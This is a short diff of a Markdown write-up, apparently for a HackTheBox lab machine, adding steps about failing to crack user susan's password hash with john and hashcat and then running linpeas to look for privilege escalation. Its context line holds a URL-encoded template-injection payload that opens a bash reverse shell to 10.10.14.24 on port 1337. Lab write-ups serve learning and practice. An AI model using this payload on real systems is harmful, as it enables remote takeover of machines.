@@ -166,7 +166,10 @@ pwn%0a<%25%3d+system("bash+-c+'exec+bash+-i+>%26+/dev/tcp/10.10.14.24/1337+0>%26
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c7678f31-8e03-4568-b1e6-e25ad421ce93)
 
 
-23. 
+23. The simplest privesc is to crack the susan password's hash. However **john** and **hashcat** failed to crack it.
+24. So I dropped linpeas to enumerate potential vuln that could lead to privesc.
+
+
 
 ## IMPORTANT LINKS
 
